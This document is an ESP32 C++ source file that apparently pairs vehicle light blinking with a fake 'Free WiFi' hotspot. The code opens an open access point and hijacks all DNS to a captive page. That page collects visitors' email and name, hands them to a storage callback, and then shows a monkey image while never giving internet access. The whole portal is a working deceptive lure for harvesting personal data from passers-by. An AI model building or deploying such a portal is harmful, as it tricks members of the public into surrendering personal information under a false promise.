#include "my_wifi_manager.h"

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <SPIFFS.h>

#define DNS_PORT 53

static DNSServer dnsServer;
static WebServer server(80);
static Preferences prefs;

static String saved_ssid;
static String saved_pass;
static bool portalActive = false;


static bool isLeftBlinking = false;
static bool isRightBlinking = false;
static bool isHazardBlinking = false;
static bool isLightsOn = false;
static bool isInteriorOn = false;
static int l_flash = 0;
static int r_flash = 0;
static int lights_pin = 0;
static int interior_pin = 0;

unsigned long lastLeftBlinkTime = 0;
unsigned long lastRightBlinkTime = 0;
bool leftLedState = LOW;
bool rightLedState = LOW;

static AddUserCallback _addUserCb = nullptr;

void setAddUserCallback(AddUserCallback cb) {
  _addUserCb = cb;
}

/* ---------- HTML PAGE ---------- */
static String wifiPage() {
  return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<style>
  body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
  input[type=text], input[type=email] { width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
  input[type=submit] { width: 100%; background-color: #4CAF50; color: white; padding: 14px 20px; margin: 8px 0; border: none; border-radius: 4px; cursor: pointer; }
  input[type=submit]:hover { background-color: #45a049; }
  .wifi-logo { width: 64px; height: 64px; fill: #4CAF50; margin-bottom: 20px; }
</style>
</head>
<body>
<svg class="wifi-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
  <path d="M12.01 21.49L23.64 7c-.45-.34-4.93-4-11.64-4C5.28 3 .81 6.66.36 7l11.63 14.49.01.01.01-.01z"/>
</svg>
<h2>Free WiFi</h2>
<h1>Fill below form to connect:</h1>
<form action="/submit" method="POST">
  <label for="email">Email</label>
  <input type="text" id="email" name="email" placeholder="Your email..">
  <label for="name">Name</label>
  <input type="text" id="name" name="name" placeholder="Your name..">
  <input type="submit" value="Submit">
</form>
</body>
</html>
)rawliteral";
}

static void handleFormSubmit() {
  if (server.hasArg("email") && server.hasArg("name")) {
    String email = server.arg("email");
    String name = server.arg("name");
    if (_addUserCb) {
      _addUserCb(email, name);
    }
    server.send(200, "text/html", R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
html, body { height: 100%; margin: 0; padding: 0; background-color: #000; overflow: hidden; }
body { display: flex; justify-content: center; align-items: center; }
img { max-width: 100%; max-height: 100%; object-fit: contain; }
</style>
</head>
<body>

<img src="/monkey.jpg" alt="monkey">

</body>
</html>
)rawliteral");
  } else {
    server.send(400, "text/plain", "Missing email or name");
  }
}




/* ---------- WEB HANDLERS ---------- */
static void handleRoot() {
  server.send(200, "text/html", wifiPage());
}

static void handleMonkeyImage() {
  if (SPIFFS.exists("/monkey.jpg")) {
    File file = SPIFFS.open("/monkey.jpg", "r");
    server.streamFile(file, "image/jpeg");
    file.close();
  } else {
    server.send(404, "text/plain", "Image not found");
  }
}


static void handleNotFound() {
  server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString() + "/", true);
  server.send(302, "text/plain", "");
}



void startPortal(int left_flash, int right_flashpin, int lights, int interior) {
  l_flash = left_flash;
  r_flash = right_flashpin;
  lights_pin = lights;
  interior_pin = interior;
  //WiFi.mode(WIFI_AP_STA);
  WiFi.mode(WIFI_AP);

  if(!SPIFFS.begin(true)){
    Serial.println("An Error has occurred while mounting SPIFFS");
  }

  String ap_ssid = "__FREE_WiFi__";
  WiFi.softAP(ap_ssid.c_str());

  WiFi.setTxPower(WIFI_POWER_11dBm);

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/submit", HTTP_POST, handleFormSubmit);
  server.on("/monkey.jpg", HTTP_GET, handleMonkeyImage);
  server.onNotFound(handleNotFound);
  server.begin();

  portalActive = true;

}



void wifiLoop() {
  if (portalActive) {
    dnsServer.processNextRequest();
    server.handleClient();

    if (isLeftBlinking) {
      if (millis() - lastLeftBlinkTime >= 500) {
        lastLeftBlinkTime = millis();
        leftLedState = !leftLedState;
        digitalWrite(l_flash, leftLedState);
      }
    }

    if (isRightBlinking) {
      if (millis() - lastRightBlinkTime >= 500) {
        lastRightBlinkTime = millis();
        rightLedState = !rightLedState;
        digitalWrite(r_flash, rightLedState);
      }
    }
  }
}
